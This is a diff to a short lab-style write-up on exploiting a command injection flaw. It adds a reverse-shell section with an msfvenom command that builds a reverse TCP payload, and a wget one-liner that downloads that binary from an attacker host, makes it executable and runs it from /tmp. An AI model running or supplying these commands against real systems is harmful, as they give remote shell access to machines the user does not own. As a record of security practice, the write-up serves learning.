@@ -1,4 +1,4 @@
-
+![image](https://github.com/user-attachments/assets/c7470cde-8c47-48a6-90cb-367623fb33a0)
 
 Exploiting the Command injection VUlnerailites
 
@@ -10,6 +10,18 @@ This was done by using the command ls
 Then which sh
 ![image](https://github.com/user-attachments/assets/0d19245f-df6f-490f-befc-daab2194951f)
 
+
+Getting a reverse shell
+bash, nc 
+This was finally done by using a static linux binary created using msfconsole and wget 
+
+`msfvenom -p linux/x64/shell_reverse_tcp  LHOST=172.22.0.1  LPORT=2294 -f elf -o shell.elf`
+
+this was what was used eventually
+wget http://172.22.0.1/shell.elf -O /tmp/shell; chmod +x /tmp/shell; /tmp/shell
+
+![image](https://github.com/user-attachments/assets/931e07d6-0e0a-41eb-9029-d5f7333ecffb)
+  
 
 
 IDOR
